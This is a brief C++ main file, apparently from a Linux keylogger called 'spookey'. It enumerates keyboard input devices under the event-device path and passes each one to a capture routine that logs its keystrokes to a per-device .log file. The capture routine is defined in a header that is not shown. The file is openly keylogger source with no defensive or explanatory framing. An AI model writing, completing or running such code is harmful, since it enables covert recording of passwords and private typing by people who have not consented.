#include <string>
#include <vector>
#include <iostream>

#include "spookey.hh"


int main(int argc, char** argv)
{
    std::vector<std::string> keyboards = getKeyboards();

    for (std::vector<std::string>::iterator it = keyboards.begin(); it != keyboards.end(); ++it) {
        std::string keyboard = DEV_INPUT_EVENT + *it;
        std::string logFile = *it + ".log";
        captureToLog(keyboard, logFile);
    }

    return 0;
}
